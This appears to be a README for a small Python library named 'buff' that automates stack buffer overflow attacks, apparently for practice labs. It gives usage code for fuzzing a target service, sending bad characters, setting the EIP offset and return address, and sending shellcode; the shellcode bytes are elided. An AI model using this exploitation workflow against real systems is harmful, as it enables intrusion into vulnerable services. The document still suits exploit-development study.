# buff
A simple BOF library I wrote under an hour to help me automate with BOF attack.
It comes with fuzzer and a generic method to generate exploit easily.

# Usage

## Fuzzer
```python
import buff

runner = buff.Buff(target = ("127.0.0.1", 1337), prefix = "OVERFLOW0 ")
runner.fuzz()
```

## Sending Bad Characters
```python
import buff

runner = buff.Buff(target = ("127.0.0.1", 1337), prefix = "OVERFLOW0 ")

runner.setBufferSize(2400)
runner.setEipOffset(1978)
runner.sendBadChars()
```

## Sending Exploit
```python
import buff

runner = buff.Buff(target = ("127.0.0.1", 1337), prefix = "OVERFLOW0 ")

# Set Buffer Size
runner.setBufferSize(2400)

# Set Eip offset
runner.setEipOffset(1978)

# Send real exploit
eip_address = "\xaf\x11\x50\x62"
runner.setEipAddress(eip_address)

exploit = ("\xdb\xde.....")
runner.setExploit(exploit)

# set padding
runner.setPaddingSize(16)

runner.sendExploit()
```
